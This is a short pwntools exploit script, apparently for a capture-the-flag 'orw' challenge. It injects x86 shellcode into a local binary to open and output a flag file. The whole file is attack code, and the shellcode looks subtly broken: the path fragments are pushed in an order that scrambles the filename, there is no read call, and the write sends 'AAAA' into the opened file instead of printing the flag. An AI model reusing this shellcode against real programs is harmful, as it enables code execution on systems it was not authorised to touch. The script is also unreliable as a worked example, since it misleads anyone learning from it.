from pwn import *

context.log_level = 'debug'

r = process('./orw')
bin = ELF('./orw')

r.recv()

shellcode = """
xor eax, eax
push {}
push {}
push {}
mov ebx, esp
mov ecx, eax
mov edx, eax
mov eax, 5
int 0x80
push {}
mov ebx, eax
mov ecx, esp
mov edx, 0x4
mov eax, 4
int 0x80
""".format(u32('/hom'), hex(u32('e/fl')), hex(u32('ag'+chr(0)+chr(0))), u32('AAAA'))
r.sendline(asm(shellcode))

r.interactive()
